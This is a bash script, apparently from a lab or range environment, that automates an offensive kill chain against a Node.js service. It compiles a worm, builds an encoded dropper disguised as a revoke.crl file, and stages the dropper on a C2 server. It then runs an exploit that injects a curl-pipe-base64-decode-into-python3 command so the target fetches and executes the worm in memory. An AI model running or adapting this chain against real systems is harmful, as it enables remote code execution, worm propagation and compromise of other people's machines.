#!/bin/bash
#
# killchain.sh - Offensive kill chain execution
#
# Assumes:
#  - Infrastructure is already deployed
#  - infra_check.sh has already been executed successfully
#  - Docker containers are running and reachable
#

# ------------------------------------------------------------
# Exit on failure
# ------------------------------------------------------------
set -e

# ------------------------------------------------------------
# Colors configuration
# ------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# ------------------------------------------------------------
# Logging helpers
# ------------------------------------------------------------
log_info()    { echo -e "${BLUE}[*]${NC} $1"; }
log_success() { echo -e "${GREEN}[+]${NC} $1"; }
log_warn()    { echo -e "${YELLOW}[!]${NC} $1"; }
log_error()   { echo -e "${RED}[-]${NC} $1"; }
log_step()    { echo -e "\n${BOLD}${CYAN}=== $1 ===${NC}\n"; }

# ------------------------------------------------------------
# Resolve script location
# ------------------------------------------------------------
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BASE_DIR="$SCRIPT_DIR/.."

# ------------------------------------------------------------
# Directories (constants)
# ------------------------------------------------------------
ATTACKER_DIR="$BASE_DIR/attacker"
WORM_DIR="$ATTACKER_DIR/worm"
C2_DIR="$ATTACKER_DIR/c2"
AUX_EXPLOITS_DIR="$SCRIPT_DIR/aux-exploits"

# ------------------------------------------------------------
# Files (constants)
# ------------------------------------------------------------
WORM_BINARY="worm"
DROPPER_SCRIPT="build-dropper.py"
DROPPER_FILE="revoke.crl"
EXPLOIT_SCRIPT="exploit-redirect.sh"

# ------------------------------------------------------------
# Target / network configuration (constants)
# ------------------------------------------------------------
TARGET_HOST="localhost"
TARGET_PORT="3000"

C2_HOST="c2"
C2_PORT="8080"

# Derived URLs
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}"
DROPPER_URL="http://${C2_HOST}:${C2_PORT}/public/${DROPPER_FILE}"

# ------------------------------------------------------------
# Runtime flags
# ------------------------------------------------------------
SKIP_COMPILE=0
SKIP_EXPLOIT=0
INTERACTIVE=0

# ------------------------------------------------------------
# Argument parsing
# ------------------------------------------------------------
while [[ $# -gt 0 ]]; do
    case "$1" in
        --skip-compile) SKIP_COMPILE=1 ;;
        --skip-exploit) SKIP_EXPLOIT=1 ;;
        --interactive)  INTERACTIVE=1 ;;
        *)
            log_error "Unknown option: $1"
            exit 1
            ;;
    esac
    shift
done

# ------------------------------------------------------------
# Step 1: Compile worm (Weaponization)
# ------------------------------------------------------------
step1_compile_worm() {
    log_step "Step 1: Worm Compilation (Weaponization)"

    if [ "$SKIP_COMPILE" -eq 1 ]; then
        log_warn "Skipping compilation (--skip-compile)"
        [ -x "$WORM_DIR/$WORM_BINARY" ] || {
            log_error "worm binary missing and compilation skipped"
            exit 1
        }
        return
    fi

    log_info "Compiling worm payload..."

    cd "$WORM_DIR"
    make clean
    make

    [ -x worm ] || {
        log_error "Compilation failed"
        exit 1
    }

    log_success "Worm compiled successfully"
}

# ------------------------------------------------------------
# Step 2: Build dropper (Payload staging)
# ------------------------------------------------------------
step2_build_dropper() {
    log_step "Step 2: Dropper Generation (Payload Staging)"

    [ -x "$WORM_DIR/$WORM_BINARY" ] || {
        log_error "Worm binary not found"
        exit 1
    }

    log_info "Building encoded dropper..."

    cd "$WORM_DIR"
    python3 "$DROPPER_SCRIPT"

    [ -f "$DROPPER_FILE" ] || {
        log_error "Dropper generation failed"
        exit 1
    }

    mkdir -p "$C2_DIR/public"
    cp -f "$DROPPER_FILE" "$C2_DIR/public/$DROPPER_FILE"

    log_success "Dropper deployed to C2"
}

# ------------------------------------------------------------
# Step 3: Initial Access & Execution
# ------------------------------------------------------------
step3_run_exploit() {
    log_step "Step 3: Initial Access & Worm Execution"

    if [ "$SKIP_EXPLOIT" -eq 1 ]; then
        log_warn "Skipping exploit (--skip-exploit)"
        log_info "Manual command:"
        echo "  $AUX_EXPLOITS_DIR/$EXPLOIT_SCRIPT $TARGET_URL \"curl -s $DROPPER_URL | grep -v '^-----' | base64 -d | python3\""
        return
    fi

    local exploit="$AUX_EXPLOITS_DIR/$EXPLOIT_SCRIPT"
    [ -x "$exploit" ] || chmod +x "$exploit"

    if [ "$INTERACTIVE" -eq 1 ]; then
        echo ""
        log_info "This will exploit the Node.js service and execute the worm"
        read -p "Press Enter to continue or Ctrl+C to abort..."
    fi

    log_info "Launching exploit against $TARGET_URL"

    local payload_cmd
    payload_cmd="curl -s $DROPPER_URL | grep -v '^-----' | base64 -d | python3"

    "$exploit" "$TARGET_URL" "$payload_cmd"

    log_success "Exploit executed – worm should now be running in memory"
}

# ------------------------------------------------------------
# Entry point
# ------------------------------------------------------------
main() {
    log_step "Offensive Kill Chain Execution"

    step1_compile_worm
    step2_build_dropper
    step3_run_exploit

    log_step "Kill Chain Complete"
    log_success "Initial access and execution completed successfully"
}

main "$@"
